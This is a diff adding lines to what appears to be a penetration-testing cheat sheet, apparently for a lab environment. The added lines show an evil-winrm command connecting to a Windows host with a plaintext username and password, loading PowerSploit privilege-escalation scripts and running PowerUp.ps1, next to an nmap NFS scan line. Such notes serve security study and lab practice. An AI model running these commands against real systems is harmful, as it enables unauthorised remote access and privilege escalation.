@@ -127,6 +127,9 @@ Transfer files from the Kali VM with smbserver.py:
 
 ## WinRM
 - WinRM from Linux: https://github.com/Hackplayers/evil-winrm
+  `# ruby evil-winrm.rb -i 10.10.10.169 -u Hans -p 'Wurst123!' -s /opt/PowerSploit/Privesc/`  
+  `*Evil-WinRM* PS C:\Users\Hans\Documents> PowerUp.ps1`  
+  Now, locate all imported functions with "menu"   
 
 ## NFS
  - `nmap -p 111 --script=nfs* -iL nfstargets.txt`  
